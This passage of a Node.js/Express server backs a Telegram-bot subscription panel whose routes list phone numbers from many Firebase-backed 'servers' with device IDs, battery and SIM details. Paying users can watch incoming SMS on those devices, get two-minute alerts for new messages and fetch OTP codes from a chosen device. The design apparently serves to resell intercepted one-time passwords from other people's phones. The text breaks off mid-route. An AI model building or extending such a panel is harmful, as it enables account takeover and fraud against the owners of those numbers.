        if (!isCsrfExemptRequest && data.csrf !== csrf) {
            return res.status(401).json({ ok: false, code: 'CSRF_INVALID', message: 'Security session changed. Reopen the panel from the Telegram bot.' });
        }

        const user = await User.findOne({ userId: data.uid }).lean();
        if (!user) {
            return res.status(401).json({ ok: false, message: 'User not found' });
        }
        if (user.isBanned) {
            return res.status(403).json({ ok: false, message: 'Banned' });
        }

        // Stable signed token/CSRF pair: safe retries and concurrent requests
        // remain valid during the configured 15-minute CSRF window.
        req.user = user;
        req.csrf = csrf;
        next();
    } catch (err) {
        console.error('[Auth] Middleware error:', err.message);
        return res.status(500).json({ ok: false, message: 'Authentication error' });
    }
}



// ==================== ROUTES ====================
const router = express.Router();


// ==================== TURNSTILE CONFIG ====================
router.get('/api/config/turnstile', (req, res) => {
    try {
        res.json({ ok: true, siteKey: config.TURNSTILE_SITE_KEY });
    } catch (err) {
        console.error('[API] Turnstile config error:', err.message);
        res.status(500).json({ ok: false, message: 'Config error' });
    }
});

// ==================== LOADING PROGRESS ====================
router.get('/api/loading-progress', async (req, res) => {
    try {
        const { servers } = await getCachedDbInfo();
        const progress = [];
        let totalNumbers = 0;
        let loadedNumbers = 0;
        let allComplete = true;
        let anyLoading = false;

        for (const s of servers) {
            const prog = cache.getLoadingProgress(s.serverId);
            if (prog) {
                progress.push({
                    serverId: s.serverId,
                    serverName: s.serverName,
                    total: prog.total,
                    loaded: prog.loaded,
                    status: prog.status,
                    percent: prog.total > 0 ? Math.round((prog.loaded / prog.total) * 100) : 100
                });
                totalNumbers += prog.total;
                loadedNumbers += prog.loaded;
                if (prog.status !== 'complete') allComplete = false;
                if (prog.status === 'loading') anyLoading = true;
            } else {
                progress.push({
                    serverId: s.serverId,
                    serverName: s.serverName,
                    total: 0, loaded: 0, status: 'pending', percent: 0
                });
                allComplete = false;
            }
        }

        const cacheReady = !getRuntimeOptions().autoFetch || servers.length === 0 || allComplete;
        const overallPercent = totalNumbers > 0 ? Math.round((loadedNumbers / totalNumbers) * 100) : (cacheReady ? 100 : 0);

        res.json({
            ok: true, progress, overallPercent, allComplete, anyLoading, cacheReady,
            ready: cacheReady,
            totalServers: servers.length, totalNumbers, loadedNumbers, autoFetch: getRuntimeOptions().autoFetch
        });
    } catch (err) {
        console.error('[API] Loading progress error:', err.message);
        res.status(500).json({ ok: false, message: 'Server error' });
    }
});

// ==================== CHANNELS CHECK ====================
router.post('/api/channels/check', async (req, res) => {
    try {
        const { initData } = req.body;
        if (!initData || typeof initData !== 'string') {
            return res.json({ ok: false, message: 'No initData' });
        }

        const tgUser = verifyTelegramInitData(initData, config.BOT_TOKEN);
        if (!tgUser) {
            return res.json({ ok: false, message: 'Invalid Telegram data' });
        }

        const { config: botConfig } = await getCachedDbInfo();
        const requiredChannels = botConfig?.requiredChannels || [];

        if (requiredChannels.length === 0) {
            return res.json({ ok: true, allJoined: true, channels: [] });
        }

        const userId = tgUser.id;
        const channelResults = [];
        const notJoined = [];

        for (const channel of requiredChannels) {
            const membership = await checkChannelMembership(userId, channel, config.BOT_TOKEN);
            const info = await getChannelInfo(channel, config.BOT_TOKEN);

            channelResults.push({
                username: channel,
                joined: membership.member,
                title: info?.title || channel,
                inviteLink: info?.inviteLink || `https://t.me/${channel.replace('@', '')}`
            });

            if (!membership.member) {
                notJoined.push({
                    username: channel,
                    title: info?.title || channel,
                    inviteLink: info?.inviteLink || `https://t.me/${channel.replace('@', '')}`
                });
            }
        }

        res.json({
            ok: true,
            allJoined: notJoined.length === 0,
            channels: channelResults,
            notJoined: notJoined
        });
    } catch (err) {
        console.error('[API] Channel check error:', err.message);
        res.status(500).json({ ok: false, message: 'Server error checking channels' });
    }
});

// ==================== AUTH LOGIN ====================
router.post('/api/auth/login', async (req, res) => {
    try {
        const { initData, turnstileToken } = req.body;

        const turnstileResult = await verifyTurnstile(turnstileToken, config.TURNSTILE_SECRET_KEY);
        if (!turnstileResult.ok) {
            return res.status(403).json({ ok: false, message: turnstileResult.message, verified: false });
        }

        if (!initData || typeof initData !== 'string') {
            return res.json({ ok: false, message: 'No initData' });
        }

        const tgUser = verifyTelegramInitData(initData, config.BOT_TOKEN);
        if (!tgUser) {
            return res.status(401).json({ ok: false, code: 'INITDATA_INVALID', message: 'Telegram cookies expired or invalid. Reopen the panel from the bot.', verified: false });
        }

        const userId = String(tgUser.id);
        const initAuthDate = Number(new URLSearchParams(initData).get('auth_date'));
        if (!Number.isFinite(initAuthDate) || initAuthDate <= 0 || Date.now() - initAuthDate * 1000 > getInitDataExpiryHours() * 60 * 60 * 1000) {
            return res.status(401).json({ ok: false, code: 'INITDATA_EXPIRED', message: 'Telegram cookies expired. Reopen the panel from the bot.', verified: false });
        }
        let user = await User.findOne({ userId }).lean();

        if (!user) {
            return res.json({ ok: false, message: 'User not registered. Start the bot first.', verified: false });
        }

        const replayClaim = await claimInitDataHash(initData, userId);
        if (!replayClaim.ok) {
            return res.status(401).json({ ok: false, code: 'INITDATA_REPLAY', message: replayClaim.reason || 'Telegram login data already used. Reopen the panel from the bot.', verified: false });
        }

        const { config: botConfig } = await getCachedDbInfo();
        if (botConfig?.isMaintenanceMode) {
            const isAdmin = botConfig.admins?.includes(userId) || userId === config.ROOT_OWNER_ID;
            if (!isAdmin) {
                return res.json({ ok: false, message: 'System under maintenance', verified: false });
            }
        }

        let deviceOk = false;
        if (!botConfig?.requireDeviceVerification) {
            deviceOk = true;
        } else if (user.verificationBypassed) {
            deviceOk = true;
        } else if (user.isDeviceVerified && user.deviceVerifiedAt) {
            const age = Date.now() - new Date(user.deviceVerifiedAt).getTime();
            deviceOk = age < config.DEVICE_VERIFY_TTL_MS;
        }

        const hasSub = user.subscriptionExpires && new Date() < new Date(user.subscriptionExpires);
        const csrf = generateCsrf();
        const token = generateToken(userId, csrf, config.TOKEN_SECRET, config.SESSION_TTL_MS);

        res.json({
            ok: true,
            verified: true,
            token,
            csrf,
            user: {
                userId: user.userId,
                firstName: user.firstName,
                username: user.username,
                points: user.points,
                totalReferrals: user.totalReferrals,
                subscriptionExpires: user.subscriptionExpires,
                isDeviceVerified: user.isDeviceVerified,
                deviceVerifiedAt: user.deviceVerifiedAt,
                isBanned: user.isBanned
            },
            hasSubscription: hasSub,
            deviceOk,
            isAdmin: botConfig?.admins?.includes(userId) || userId === config.ROOT_OWNER_ID,
            autoFetch: getRuntimeOptions().autoFetch
        });
    } catch (err) {
        console.error('[API] Login error:', err.message);
        res.status(500).json({ ok: false, message: 'Server error. Please try again.' });
    }
});

// ==================== DASHBOARD ====================
router.get('/api/dashboard', authMiddleware, async (req, res) => {
    try {
        const user = req.user;

        // Check dashboard cache (5 sec)
        const cachedDashboard = cache.getDashboardCache();
        if (cachedDashboard) {
            return res.json({
                ...cachedDashboard,
                user: {
                    userId: user.userId,
                    firstName: user.firstName,
                    username: user.username,
                    points: user.points,
                    totalReferrals: user.totalReferrals,
                    subscriptionExpires: user.subscriptionExpires,
                    isDeviceVerified: user.isDeviceVerified,
                    deviceVerifiedAt: user.deviceVerifiedAt
                },
                hasSubscription: user.subscriptionExpires && new Date() < new Date(user.subscriptionExpires),
                cached: true
            });
        }

        const { servers } = await getCachedDbInfo();

        // CACHE FIRST: Try cached server numbers; fallback to getCachedServerCounts if cache empty
        let serverCounts = [];
        let totalNumbers = 0;
        let activeNumbers = 0;
        let usedFallback = false;

        for (const s of servers) {
            const cached = cache.getServerNumbers(s.serverId);
            if (cached && Array.isArray(cached.numbers) && cache.hasFreshServerNumbers(s.serverId, getRuntimeOptions().serverTtlMs)) {
                const validCachedNumbers = normalizeValidNumberRecords(cached.numbers);
                const count = validCachedNumbers.length;
                const online = validCachedNumbers.filter(n => n.online === true || String(n.status || '').toLowerCase() === 'online').length;
                serverCounts.push({
                    serverId: s.serverId,
                    serverName: s.serverName,
                    serverKey: s.serverKey,
                    count,
                    online,
                    offline: count - online,
                    firebase: isFirebaseServer(s)
                });
                totalNumbers += count;
                activeNumbers += online;
            } else {
                usedFallback = true;
            }
        }

        // Never make the first dashboard render wait for hundreds of cold APIs.
        // Return stale counts when available and let the background cache worker
        // refresh them; the numbers view remains cache-first/on-demand.
        if (usedFallback || serverCounts.length === 0) {
            const fallbackCounts = cache.memory.serverCounts.length
                ? cache.memory.serverCounts
                : servers.map(s => ({
                    serverId: s.serverId, serverName: s.serverName, serverKey: s.serverKey,
                    count: 0, online: 0, offline: 0, firebase: isFirebaseServer(s)
                }));
            totalNumbers = fallbackCounts.reduce((sum, item) => sum + (item.count || 0), 0);
            activeNumbers = fallbackCounts.reduce((sum, item) => sum + Number(item.online || 0), 0);
            serverCounts = fallbackCounts.map(item => ({
                ...item,
                count: Number(item.count || 0),
                online: Number(item.online || 0),
                offline: Number(item.offline || 0)
            }));
            if (!cache.recentCacheRefreshing && getRuntimeOptions().autoFetch) {
                refreshRecentCache().catch(error => console.error('[API] Background dashboard refresh:', error.message));
            }
        }

        const hasSub = user.subscriptionExpires && new Date() < new Date(user.subscriptionExpires);
        const cacheLoading = Array.from(cache.memory.loadingProgress.values()).some(p => p.status === 'loading');

        const result = {
            ok: true,
            totalServers: servers.length,
            totalNumbers,
            activeNumbers,
            serverCounts,
            servers: servers.map(s => ({
                serverId: s.serverId, serverName: s.serverName, serverKey: s.serverKey,
                pathVariant: Boolean(s.firebaseDbId && servers.some(other => other !== s && String(other.firebaseDbId || '').trim().toLowerCase() === String(s.firebaseDbId || '').trim().toLowerCase() && (String(other.userPath || 'clients').trim().replace(/^\/+|\/+$/g, '').toLowerCase() !== String(s.userPath || 'clients').trim().replace(/^\/+|\/+$/g, '').toLowerCase() || String(other.smsPath || 'messages').trim().replace(/^\/+|\/+$/g, '').toLowerCase() !== String(s.smsPath || 'messages').trim().replace(/^\/+|\/+$/g, '').toLowerCase())))
            })),
            cacheLoading,
            autoFetch: getRuntimeOptions().autoFetch
        };

        cache.setDashboardCache(result);

        res.json({
            ...result,
            user: {
                userId: user.userId,
                firstName: user.firstName,
                username: user.username,
                points: user.points,
                totalReferrals: user.totalReferrals,
                subscriptionExpires: user.subscriptionExpires,
                isDeviceVerified: user.isDeviceVerified,
                deviceVerifiedAt: user.deviceVerifiedAt
            },
            hasSubscription: hasSub
        });
    } catch (err) {
        console.error('[API] Dashboard error:', err.message);
        res.status(500).json({ ok: false, message: 'Server error. Please refresh.' });
    }
});

// ==================== NUMBERS LIST ====================
router.post('/api/numbers', authMiddleware, async (req, res) => {
    try {
        const { serverId, page = 1, limit = 20, search = '', onlineOnly = false } = req.body;
        if (!serverId) {
            return res.json({ ok: false, message: 'serverId required' });
        }

        const user = req.user;
        const hasSub = user.subscriptionExpires && new Date() < new Date(user.subscriptionExpires);
        if (!hasSub) {
            return res.json({ ok: false, message: 'Subscription required' });
        }

        let allNumbers = [];
        let serverName = '';
        let failedServers = [];
        const { servers } = await getCachedDbInfo();

        if (serverId === 'all') {
            // CACHE-FIRST: Stage 1 — pull everything we already have in memory
            const cacheMisses = [];
            for (const s of servers) {
                const cached = cache.getServerNumbers(s.serverId);
                if (cached && Array.isArray(cached.numbers) && cache.hasFreshServerNumbers(s.serverId, getRuntimeOptions().serverTtlMs)) {
                    allNumbers.push(...normalizeValidNumberRecords(cached.numbers));
                } else {
                    cacheMisses.push(s);
                }
            }

            // If a server is not warmed yet, fetch it on demand so available
            // numbers are visible immediately. The background worker still refreshes
            // and maintains the same in-memory cache for subsequent requests.
            if (cacheMisses.length > 0) {
                const fetched = await batchProcess(cacheMisses, config.SERVER_CONCURRENCY, async (s) => {
                    try {
                        const nums = await getServerNumbersFromSource(s) || [];
                        cache.setServerNumbers(s.serverId, { numbers: nums, timestamp: Date.now() });
                        return { server: s, nums, fetched: true };
                    } catch (error) {
                        return { server: s, nums: [], error: error.message };
                    }
                });
                for (const result of fetched.filter(x => x.status === 'fulfilled').map(x => x.value)) {
                    if (result.nums.length) allNumbers.push(...result.nums);
                    else if (result.error) failedServers.push({ serverId: result.server.serverId, serverName: result.server.serverName, error: result.error });
                }
            }

            serverName = 'All Servers';
        } else {
            const server = servers.find(s => s.serverId === parseInt(serverId));
            if (!server) {
                return res.json({ ok: false, message: 'Server not found' });
            }
            serverName = server.serverName;

            // Cache-first single server
            const cached = cache.getServerNumbers(server.serverId);
            if (cached && Array.isArray(cached.numbers) && cache.hasFreshServerNumbers(server.serverId, getRuntimeOptions().serverTtlMs)) {
                allNumbers = normalizeValidNumberRecords(cached.numbers);
            } else {
                // Fetch a cold server on demand instead of making the user wait
                // for the background cache worker.
                try {
                    allNumbers = await getServerNumbersFromSource(server) || [];
                    cache.setServerNumbers(server.serverId, { numbers: allNumbers, timestamp: Date.now() });
                } catch (error) {
                    return res.json({ ok: false, message: 'Unable to fetch numbers right now. Please retry.', failedServers: [{ serverId: server.serverId, serverName: server.serverName, error: error.message }] });
                }
            }
        }

        // Filter duplicates
        const seenNumbers = new Set();
        const uniqueNumbers = [];
        for (const n of allNumbers) {
            const key = String(n.number || '').trim();
            if (!seenNumbers.has(key)) {
                seenNumbers.add(key);
                uniqueNumbers.push(n);
            }
        }

        // FIX: Ensure all numbers have required fields
        const safeNumbers = uniqueNumbers.map(n => ({
            ...n,
            number: String(n.number || '').trim(),
            status: n.status || 'Offline',
            serverName: n.serverName || n.server || 'Server',
            serverId: n.serverId || null,
            serverKey: n.serverKey || null,
            deviceId: n.deviceId || n.device_id || null,
            deviceName: n.deviceName || n.name || 'Device',
            battery: n.battery || null,
            operator: n.operator || null,
            simSlot: n.simSlot || n.sim_slot || '',
            simCarrier: n.simCarrier || n.sim_carrier || '',
            sims: Array.isArray(n.sims) ? n.sims : []
        })).filter(n => n.number.length >= 5);

        const enrichedNumbers = safeNumbers.map(n => {
            let cacheEntry = null;
            let foundTier = null;
            // FIX: Safe cache access
            const recentCaches = cache && cache.memory && cache.memory.recentCache ? cache.memory.recentCache : {};
            for (const tier of ['2', '10', '30', '60', 'older']) {
                const tierMap = recentCaches[tier];
                if (tierMap && typeof tierMap.get === 'function') {
                    cacheEntry = tierMap.get(n.number);
                    if (cacheEntry && Date.now() - (cacheEntry.mostRecentSmsTime || cacheEntry.timestamp || 0) > config.SMS_EXPIRY_MINUTES * 60 * 1000) {
                        tierMap.delete(n.number);
                        cacheEntry = null;
                    }
                    if (cacheEntry) {
                        foundTier = tier;
                        break;
                    }
                }
            }

            if (cacheEntry) {
                const ageMs = Date.now() - (cacheEntry.mostRecentSmsTime || 0);
                let currentTier = 'none';
                if (cacheEntry.hasSms && cacheEntry.mostRecentSmsTime > 0) {
                    if (ageMs <= 2 * 60000 && ageMs >= 0) currentTier = '2min';
                    else if (ageMs <= 10 * 60000 && ageMs >= 0) currentTier = '10min';
                    else if (ageMs <= 30 * 60000 && ageMs >= 0) currentTier = '30min';
                    else if (ageMs <= 60 * 60000 && ageMs >= 0) currentTier = '60min';
                    else currentTier = 'older';
                } else {
                    currentTier = 'older';
                }

                let indianDisplayTime = cacheEntry.mostRecentDisplayTime || null;
                if (cacheEntry.mostRecentSmsTime > 0) {
                    indianDisplayTime = formatIndianTime(cacheEntry.mostRecentSmsTime);
                }

                return {
                    ...n,
                    device_id: n.device_id || n.deviceId || null,
                    serverKey: n.serverKey || null,
                    serverId: n.serverId || null,
                    _smsTime: cacheEntry.mostRecentSmsTime || 0,
                    _displayTime: indianDisplayTime,
                    _smsCount: cacheEntry.smsCount || 0,
                    _hasSms: cacheEntry.hasSms || false,
                    _fetchMode: cacheEntry.fetchMode || 'unknown',
                    _fetchParameter: cacheEntry.fetchParameter || null,
                    _cacheTier: currentTier,
                    _fetchFailed: cacheEntry.fetchFailed || false
                };
            }

            return {
                ...n,
                device_id: n.device_id || n.deviceId || null,
                serverKey: n.serverKey || null,
                serverId: n.serverId || null,
                _smsTime: 0,
                _displayTime: null,
                _smsCount: 0,
                _hasSms: false,
                _fetchMode: 'unknown',
                _fetchParameter: null,
                _cacheTier: 'none',
                _fetchFailed: false
            };
        });

        enrichedNumbers.sort((a, b) => (b._smsTime || 0) - (a._smsTime || 0));

        let filteredNumbers = onlineOnly === true || String(onlineOnly).toLowerCase() === 'true' ? enrichedNumbers.filter(numberIsOnline) : enrichedNumbers;
        if (search && search.trim()) {
            const q = search.trim().toLowerCase();
            filteredNumbers = filteredNumbers.filter(n => n.number.toLowerCase().includes(q));
        }

        const totalNumbers = filteredNumbers.length;
        const totalPages = Math.ceil(totalNumbers / limit);
        const start = (page - 1) * limit;
        const paginated = filteredNumbers.slice(start, start + limit);

        res.json({
            ok: true,
            numbers: paginated,
            serverName,
            totalNumbers,
            totalPages,
            currentPage: page,
            hasMore: page < totalPages,
            failedServers: serverId === 'all' ? failedServers : [],
            cachePartial: Boolean(req.body?.cacheOnly && failedServers.length),
            cacheInfo: {
                '2min': cache.memory.recentCache['2'].size,
                '10min': cache.memory.recentCache['10'].size,
                '30min': cache.memory.recentCache['30'].size,
                '60min': cache.memory.recentCache['60'].size,
                'older': cache.memory.recentCache['older'].size
            }
        });
    } catch (err) {
        console.error('[API] Numbers error:', err.message);
        res.status(500).json({ ok: false, message: 'Server error. Please refresh.' });
    }
});

// ==================== STARRED NUMBER AVAILABILITY ====================
// Additive route for the panel's 7-day starred-number availability check.
// A single request can verify many starred numbers while each server's cached
// number list is loaded only once, which keeps reloads fast and lightweight.
router.post('/api/number/availability', authMiddleware, async (req, res) => {
    try {
        const body = req.body || {};
        const requestedNumbers = Array.isArray(body.numbers) ? body.numbers : [body.number];
        const normalizedNumbers = [...new Set(requestedNumbers
            .map(value => validatePhoneNumber(value) || String(value || '').replace(/\D/g, ''))
            .filter(Boolean))];
        const isBatch = Array.isArray(body.numbers);

        if (normalizedNumbers.length === 0) {
            return res.json({ ok: false, available: false, found: false, message: 'Valid number required' });
        }

        const user = req.user;
        const hasSub = user.subscriptionExpires && new Date() < new Date(user.subscriptionExpires);
        if (!hasSub) {
            return res.json({ ok: false, available: false, found: false, message: 'Subscription required' });
        }

        const { servers = [] } = await getCachedDbInfo();
        const shouldSearchAll = body.searchAllServers !== false && body.searchAllServers !== 'false';
        const targetServers = shouldSearchAll || !body.serverId || String(body.serverId) === 'all'
            ? servers
            : servers.filter(server => String(server.serverId) === String(body.serverId));
        const requestedSet = new Set(normalizedNumbers);
        const checkedAt = Date.now();

        const makeResult = (number, hit, reachableServers) => {
            const allServersReachable = reachableServers === targetServers.length && targetServers.length > 0;
            if (!hit) {
                return {
                    number,
                    available: allServersReachable ? false : null,
                    found: false,
                    checkFailed: !allServersReachable
                };
            }

            const match = hit.match;
            const matchStatus = String(match.status || '').toLowerCase();
            const isMatchOffline = match.online === false || matchStatus === 'offline' || match.available === false;
            return {
                number,
                available: !isMatchOffline,
                found: true,
                checkFailed: false,
                serverId: hit.server.serverId,
                serverKey: hit.server.serverKey,
                serverName: hit.server.serverName,
                match: {
                    ...match,
                    number: validatePhoneNumber(match.number) || number,
                    serverId: hit.server.serverId,
                    serverKey: match.serverKey || hit.server.serverKey,
                    serverName: hit.server.serverName,
                    server: hit.server.serverName,
                    deviceId: match.deviceId || match.device_id || null,
                    device_id: match.device_id || match.deviceId || null
                }
            };
        };

        if (targetServers.length === 0) {
            const results = normalizedNumbers.map(number => makeResult(number, null, 0));
            if (isBatch) return res.json({ ok: true, results, searchedServers: 0, checkedAt });
            return res.json({ ok: true, ...results[0], searchedServers: 0, checkedAt });
        }

        const outcomes = await batchProcess(targetServers, config.SERVER_CONCURRENCY, async server => {
            try {
                let serverNumbers;
                const cached = cache.getServerNumbers(server.serverId);
                if (cached && Array.isArray(cached.numbers) && cache.hasFreshServerNumbers(server.serverId, getRuntimeOptions().serverTtlMs)) {
                    serverNumbers = cached.numbers;
                } else {
                    // CACHE-ONLY: skip source fetch; cache builder handles this
                    serverNumbers = [];
                }
                if (!serverNumbers) {
                    try {
                        serverNumbers = await getServerNumbersFromSource(server) || [];
                        cache.setServerNumbers(server.serverId, { numbers: serverNumbers, timestamp: Date.now() });
                    } catch (sourceError) {
                        return { server, reachable: false, matches: [] };
                    }
                }
                // A reachable server with zero numbers is still reachable.
                if (!Array.isArray(serverNumbers)) serverNumbers = [];

                const matches = serverNumbers.filter(item => {
                    const itemNumber = validatePhoneNumber(item.number) || String(item.number || '').replace(/\D/g, '');
                    return requestedSet.has(itemNumber);
                }).map(item => ({
                    number: validatePhoneNumber(item.number) || String(item.number || '').replace(/\D/g, ''),
                    item
                }));
                return { server, reachable: true, matches };
            } catch (error) {
                console.error(`[API] Star availability error for ${server.serverName}:`, error.message);
                return { server, reachable: false, matches: [] };
            }
        });

        const reachableServers = outcomes.filter(result => result.status === 'fulfilled' && result.value && result.value.reachable).length;
        const matchesByNumber = new Map();
        outcomes.forEach(result => {
            if (result.status !== 'fulfilled' || !result.value || !result.value.reachable) return;
            result.value.matches.forEach(entry => {
                if (!matchesByNumber.has(entry.number)) {
                    matchesByNumber.set(entry.number, { server: result.value.server, match: entry.item });
                }
            });
        });

        const results = normalizedNumbers.map(number => makeResult(number, matchesByNumber.get(number) || null, reachableServers));
        if (isBatch) {
            return res.json({ ok: true, results, searchedServers: targetServers.length, reachableServers, checkedAt });
        }
        return res.json({ ok: true, ...results[0], searchedServers: targetServers.length, reachableServers, checkedAt });
    } catch (err) {
        console.error('[API] Star availability route error:', err.message);
        res.status(500).json({ ok: false, available: null, found: false, checkFailed: true, message: 'Availability check failed' });
    }
});

// ==================== SMS NOTIFICATIONS (Latest 2 Min) ====================
router.get('/api/sms-notifications', authMiddleware, async (req, res) => {
    try {
        const user = req.user;
        const hasSub = user.subscriptionExpires && new Date() < new Date(user.subscriptionExpires);
        if (!hasSub) {
            return res.json({ ok: false, message: 'Subscription required' });
        }

        const now = Date.now();
        const notifCache = cache.getSmsNotifications();
        const notifications = [];

        for (const [number, entry] of notifCache) {
            // Strict two-minute notification window. Older SMS belong only to
            // the history/recent-number views, never to live alerts.
            if (entry && entry.smsTime > 0 && (now - entry.smsTime) >= 0 && (now - entry.smsTime) <= 2 * 60000) {
                notifications.push({
                    number: entry.number,
                    serverId: entry.serverId,
                    serverName: entry.serverName || '',
                    status: entry.status || 'Online',
                    deviceId: entry.deviceId || null,
                    smsTime: entry.smsTime,
                    smsDisplayTime: entry.smsDisplayTime,
                    smsCount: entry.smsCount,
                    latestSms: entry.latestSms
                });
            }
        }

        // Sort by newest SMS first
        notifications.sort((a, b) => (b.smsTime || 0) - (a.smsTime || 0));

        res.json({
            ok: true,
            notifications,
            total: notifications.length,
            fromCacheTier: 'sms_notification_2min'
        });
    } catch (err) {
        console.error('[API] SMS notifications error:', err.message);
        res.status(500).json({ ok: false, message: 'Server error. Please try again.' });
    }
});

// ==================== RECENT NUMBERS ====================
router.post('/api/numbers/recent', authMiddleware, async (req, res) => {
    try {
        const { serverId, recentMinutes = 10, search = '', onlineOnly = false } = req.body;
        if (!serverId) {
            return res.json({ ok: false, message: 'serverId required' });
        }

        const user = req.user;
        const hasSub = user.subscriptionExpires && new Date() < new Date(user.subscriptionExpires);
        if (!hasSub) {
            return res.json({ ok: false, message: 'Subscription required' });
        }

        const minutes = parseInt(recentMinutes);
        if (isNaN(minutes) || minutes < 1 || minutes > 60) {
            return res.json({ ok: false, message: 'Invalid time value (1-60 min)' });
        }

        const { servers } = await getCachedDbInfo();
        const now = Date.now();

        let targetCaches = [];
        if (minutes <= 2) {
            targetCaches = ['2'];
        } else if (minutes <= 10) {
            targetCaches = ['2', '10'];
        } else if (minutes <= 30) {
            targetCaches = ['2', '10', '30'];
        } else if (minutes <= 60) {
            targetCaches = ['2', '10', '30', '60'];
        } else {
            targetCaches = ['2', '10', '30', '60', 'older'];
        }

        let recentNumbers = [];
        const seenNumbers = new Set();

        for (const tier of targetCaches) {
            const cacheMap = cache.memory.recentCache[tier];
            for (const [numKey, entry] of cacheMap) {
                if (seenNumbers.has(numKey)) continue;
                if (serverId !== 'all' && String(entry.serverId) !== String(serverId)) continue;
                seenNumbers.add(numKey);

                let isValidForFilter = false;
                if (entry.hasSms && entry.mostRecentSmsTime > 0) {
                    const ageMs = now - entry.mostRecentSmsTime;
                    if (ageMs >= 0 && ageMs <= minutes * 60000) {
                        isValidForFilter = true;
                    }
                }
                if (!isValidForFilter) {
                    if (tier === 'older' && minutes >= 60) {
                        isValidForFilter = true;
                    }
                    if (!entry.hasSms && tier === 'older') {
                        isValidForFilter = true;
                    }
                }
                if (!isValidForFilter) continue;

                let indianDisplayTime = entry.mostRecentDisplayTime || null;
                if (entry.mostRecentSmsTime > 0) {
                    indianDisplayTime = formatIndianTime(entry.mostRecentSmsTime);
                }

                recentNumbers.push({
                    ...entry.data,
                    device_id: entry.data.device_id || entry.data.deviceId || null,
                    serverKey: entry.data.serverKey || null,
                    serverId: entry.data.serverId || null,
                    _smsTime: entry.mostRecentSmsTime,
                    _displayTime: indianDisplayTime,
                    _cacheTier: tier,
                    _smsCount: entry.smsCount || 0,
                    _hasSms: entry.hasSms || false,
                    _fetchMode: entry.fetchMode || 'unknown',
                    _fetchParameter: entry.fetchParameter || null,
                    _fetchFailed: entry.fetchFailed || false
                });
            }
        }

        recentNumbers.sort((a, b) => (b._smsTime || 0) - (a._smsTime || 0));

        let filtered = onlineOnly === true || String(onlineOnly).toLowerCase() === 'true' ? recentNumbers.filter(numberIsOnline) : recentNumbers;
        if (search && search.trim()) {
            const q = search.trim().toLowerCase();
            filtered = filtered.filter(n => n.number.toLowerCase().includes(q));
        }

        res.json({
            ok: true,
            numbers: filtered,
            totalNumbers: filtered.length,
            totalPages: 1,
            currentPage: 1,
            filter: { recentMinutes: minutes, onlineOnly: onlineOnly === true || String(onlineOnly).toLowerCase() === 'true' },
            serverName: serverId === 'all' ? 'All Servers' : (servers.find(s => s.serverId === parseInt(serverId))?.serverName || 'Server'),
            cacheInfo: {
                '2min': cache.memory.recentCache['2'].size,
                '10min': cache.memory.recentCache['10'].size,
                '30min': cache.memory.recentCache['30'].size,
                '60min': cache.memory.recentCache['60'].size,
                'older': cache.memory.recentCache['older'].size
            },
            autoFetch: getRuntimeOptions().autoFetch
        });
    } catch (err) {
        console.error('[API] Recent numbers error:', err.message);
        res.status(500).json({ ok: false, message: 'Server error. Please refresh.' });
    }
});

// ==================== FETCH OTP ====================
router.post('/api/fetch-otp', authMiddleware, async (req, res) => {
    try {
        const { number, deviceId, device_id, serverId, serverKey, smsOnly = false, sims: suppliedSims } = req.body;
        const targetNumber = validatePhoneNumber(number) || String(number || '').replace(/\D/g, '');
        const targetDeviceId = deviceId || device_id || '';

        if ((!targetNumber && !targetDeviceId) || !serverId) {
            return res.json({ ok: false, message: 'serverId and number or deviceId required' });
        }

        const user = req.user;
        const hasSub = user.subscriptionExpires && new Date() < new Date(user.subscriptionExpires);
        if (!hasSub) {
            return res.json({ ok: false, message: 'Subscription required' });
        }

        const smsLimit = getRuntimeOptions().smsLatestLimit;
        const { servers } = await getCachedDbInfo();
        const candidates = serverId === 'all' ? servers : servers.filter(s => String(s.serverId) === String(serverId));

        let selectedServer = null;
        let smsList = [];
        let matchedDevice = null;

        // ==================== ALWAYS REAL-TIME FETCH (CACHE-FREE) ====================
        for (const server of candidates) {
            const source = await getSmsFromSource(server, targetNumber, targetDeviceId, smsLimit, { skipDeviceLookup: Boolean(smsOnly), device: smsOnly && Array.isArray(suppliedSims) ? { device_id: targetDeviceId, sims: suppliedSims, online: true, status: 'online' } : null });
            if (source.sms && source.sms.length) {
                selectedServer = server;
                smsList = source.sms;
                matchedDevice = source.device;
                break;
            }
        }

        if (!selectedServer) {
            return res.json({ ok: false, message: serverId === 'all' ? 'Number/device not found on any server' : 'No OTP data received' });
        }

        const smsFallbackNumber = smsList.reduce((found, sms) => {
            if (found) return found;
            const body = sms && (sms.body || sms.message || sms.text || sms.content || '');
            return extractFirstPhoneFromSms(body);
        }, null);
        const deviceSims = (Array.isArray(matchedDevice?.sims) ? matchedDevice.sims : (Array.isArray(suppliedSims) ? suppliedSims : []))
            .map((sim, index) => ({ slot: String(sim?.slot || index + 1), number: validatePhoneNumber(sim?.number || sim?.phone || sim?.mobile) || '', carrier: String(sim?.carrier || sim?.operator || sim?.network || '') }))
            .filter(sim => sim.number);
        const hasSim1 = deviceSims.some(sim => sim.slot === '1');
        const hasSim2 = deviceSims.some(sim => sim.slot === '2');
        const fallbackNumber = !hasSim2 ? smsFallbackNumber : null;
        const displaySims = deviceSims.map(sim => ({ ...sim, fallback: false }));
        if (!hasSim2) {
            displaySims.push(fallbackNumber
                ? { slot: '2', number: fallbackNumber, carrier: '', fallback: true, label: 'SIM 2 - Fallback' }
                : { slot: '2', number: '', carrier: '', missing: true, label: 'SIM 2 -' });
        }

        const otps = smsList.slice(0, 25).map(s => {
            let displayStr = getSmsDisplayTime(s);

            if (!displayStr) {
                const timeFields = ['time', 'date', 'timestamp', 'created_at', 'createdAt', 'sent_time', 'received_time', 'date_value'];
                for (const field of timeFields) {
                    if (s[field]) {
                        const parsed = getSmsTimestampUtc({ [field]: s[field] });
                        if (parsed) {
                            displayStr = formatIndianTime(parsed);
                            break;
                        }
                    }
                }
            }

            // Guard against object leakage
            let messageText = s.body || s.message || s.text || s.content || '';
            if (typeof messageText === 'object') messageText = JSON.stringify(messageText);
            if (messageText === '[object Object]') messageText = '';

            let detectedOtp = s.otp_1 || s.otp || null;
            if (!detectedOtp && messageText) {
                detectedOtp = extractOtpFromMessage(messageText, 'all');
            }

            return {
                // Preserve every source SMS key, then add normalized panel fields.
                ...(s && typeof s === 'object' ? s : {}),
                sender: s.sender || s.from || 'Unknown',
                message: messageText,
                otp_1: detectedOtp,
                otp_2: s.otp_2 || null,
                time: displayStr || 'Just now',
                deviceId: s.device_id || targetDeviceId || null,
                sourceKeys: s && typeof s === 'object' ? Object.keys(s) : [],
